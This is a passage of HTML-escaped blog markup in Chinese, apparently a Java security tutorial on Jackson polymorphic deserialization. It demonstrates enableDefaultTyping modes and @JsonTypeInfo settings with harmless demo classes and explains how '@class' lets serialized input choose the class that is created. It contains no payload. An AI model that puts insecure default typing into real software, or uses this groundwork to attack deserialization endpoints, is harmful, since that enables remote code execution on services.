+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public int age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public Object object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public Sex sex;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    @Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    public String toString() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        return String.format(&amp;#34;Person.age=%d, Person.name=%s, %s, %s&amp;#34;, age, name, object == null ? &amp;#34;null&amp;#34; : object, sex == null ? &amp;#34;null&amp;#34; : sex);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;修改Test&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person = new Person();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.age = 20;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.object = new hack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;person.sex = new MySex();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String json = mapper.writeValueAsString(person);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person person1 = mapper.readValue(json, Person.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734519148410-f3e9a26b-18a0-4df9-af8a-1520ba4b9418.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以看到该&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;Interface类属性被成功序列化和反序列化&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;不设置运行后报错&lt;/p&gt;
+&lt;h4 id=&#34;non_concrete_and_arrays&#34;&gt;NON_CONCRETE_AND_ARRAYS
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;NON_CONCRETE_AND_ARRAYS：除了前面提到的特征外，还支持 Array 类型。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;编写序列化与反序列化的代码，在 Object 属性中存在的是数组：&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Person person = new Person();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.age = 20;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  hack[] hacks = new hack[2];
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  hacks[0] = new hack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  hacks[1] = new hack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.object = hacks;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  person.sex = new MySex();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  String json = mapper.writeValueAsString(person);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  Person person1 = mapper.readValue(json, Person.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  System.out.println(person1);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;``{&amp;ldquo;age&amp;rdquo;:20,&amp;ldquo;name&amp;rdquo;:&amp;ldquo;ygsr&amp;rdquo;,&amp;ldquo;object&amp;rdquo;:[&amp;quot;&lt;strong&gt;[L&lt;/strong&gt;JAVA_LANG_OBJECT.hack;&amp;quot;,[[&amp;ldquo;JAVA_LANG_OBJECT.hack&amp;rdquo;,{&amp;ldquo;skill&amp;rdquo;:&amp;ldquo;dance&amp;rdquo;}],[&amp;ldquo;JAVA_LANG_OBJECT.hack&amp;rdquo;,{&amp;ldquo;skill&amp;rdquo;:&amp;ldquo;dance&amp;rdquo;}]]],&amp;ldquo;sex&amp;rdquo;:[&amp;ldquo;OBJECT_AND_NON_CONCRETE.MySex&amp;rdquo;,{&amp;ldquo;sex&amp;rdquo;:0}]}&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;类名变成了 &lt;/font&gt;&lt;code&gt;”[L”+类名+”;”&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;，序列化 Object 之后为数组形式，反序列化之后得到&lt;/font&gt;&lt;code&gt;[Lcom.mi1k7ea.Hacker;&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 类对象，说明对 Array 类型成功进行了序列化和反序列化：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;h4 id=&#34;non_final&#34;&gt;NON_FINAL
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;NON_FINAL：除了前面的所有特征外，包含即将被序列化的类里的全部、非 final 的属性，也就是相当于整个类、除 final 外的属性信息都需要被序列化和反序列化。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;这个不演示了&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;h4 id=&#34;小结&#34;&gt;小结
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520389120-285b5f34-3346-4e39-ab92-b0df63c1515a.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;jsontypeinfo-注解&#34;&gt;@JsonTypeInfo 注解
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;@JsonTypeInfo&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; 注解是 Jackson 多态类型绑定的一种方式，支持下面5种类型的取值：&lt;/font&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)  
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.CUSTOM)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;jsontypeinfoidnone&#34;&gt;JsonTypeInfo.Id.NONE
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person2 p = new Person2();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p.age = 6;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p.name = &amp;#34;ygsr&amp;#34;;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;p.object = new hack();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ObjectMapper mapper = new ObjectMapper();
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;String json = mapper.writeValueAsString(p);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(json);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Person2 p2 = mapper.readValue(json, Person2.class);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;System.out.println(p2);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public int age;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public String name;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;//加上注解
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public Object object;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@Override
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;public String toString() {
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  return String.format(&amp;#34;Person.age=%d, Person.name=%s, %s&amp;#34;, age, name, object == null ? &amp;#34;null&amp;#34; : object);
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520607757-07da6baa-8208-4575-a906-aff1b8769f2f.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;不加注解结果也是一样&lt;/p&gt;
+&lt;h4 id=&#34;jsontypeinfoidclass&#34;&gt;JsonTypeInfo.Id.CLASS
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;修改 Person2 类中的 object 属性&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;@JsonTypeInfo&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;注解值为&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;JsonTypeInfo.Id.CLASS&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;输出看到，object属性中多了 &lt;/font&gt;&lt;code&gt;&amp;quot;@class&amp;quot;:&amp;quot;com.drunkbaby.Hacker&amp;quot;&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; ，即含有具体的类的信息，同时反序列化出来的object属性Hacker类对象，即能够成功对指定类型进行序列化和反序列化：&lt;/font&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520660816-eb5d5c52-8716-407b-80bf-a2e0f91d7e7e.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;也就是说，在Jackson反序列化的时候如果使用了&lt;/font&gt;&lt;code&gt;JsonTypeInfo.Id.CLASS&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;修饰的话，可以通过@class的方式指定相关类，并进行相关调用。&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;h4 id=&#34;jsontypeinfoidminimal_class&#34;&gt;JsonTypeInfo.Id.MINIMAL_CLASS
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;修改 Person2 类中的object属性&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;@JsonTypeInfo&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;注解值为&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;JsonTypeInfo.Id.MINIMAL_CLASS&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;输出看到，object属性中多了 &lt;/font&gt;&lt;code&gt;&amp;quot;@c&amp;quot;:&amp;quot;com.drunkbaby.Hacker&amp;quot;&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;，即使用 @c 替代了 @class，官方描述中的意思是缩短了相关类名，实际效果和 JsonTypeInfo.Id.CLASS 类似，能够成功对指定类型进行序列化和反序列化，都可以用于指定相关类并进行相关的调用：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520758225-ebbb6d35-e2fc-4196-9b61-c267e90e6732.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;jsontypeinfoidname&#34;&gt;JsonTypeInfo.Id.NAME
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;修改 Person2 类中的object属性&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;@JsonTypeInfo&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;注解值为&lt;/font&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt; &lt;/font&gt;&lt;code&gt;JsonTypeInfo.Id.NAME&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;输出看到，object 属性中多了 &lt;/font&gt;&lt;code&gt;&amp;quot;@type&amp;quot;:&amp;quot;Hacker&amp;quot;&lt;/code&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734520801555-cc12309b-ea3c-4a23-beb6-b59cf978294a.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;jsontypeinfoidcustom&#34;&gt;JsonTypeInfo.Id.CUSTOM
+&lt;/h4&gt;&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;这个值时提供给用户自定义的意思，我们是没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常&lt;/font&gt;&lt;/p&gt;
+&lt;p&gt;&lt;font style=&#34;color:rgb(80, 80, 92);&#34;&gt;&lt;/font&gt;&lt;/p&gt;
+&lt;h2 id=&#34;反序列化中类属性方法的调用&#34;&gt;反序列化中类属性方法的调用
+&lt;/h2&gt;&lt;h3 id=&#34;使用-defaulttyping&#34;&gt;使用 DefaultTyping
+&lt;/h3&gt;&lt;p&gt;给MySex类加上构造方法&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;F:%5c%e5%8d%9a%e5%ae%a2%5cbj%5cweb%5cjava%e5%ae%89%e5%85%a8%5cimages%5c1734521118466-d6e22222-2c02-4a35-b3e2-1c33b881a25c.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;Test只进行反序列化和&lt;code&gt;enableDefaultTyping&lt;/code&gt;无参&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
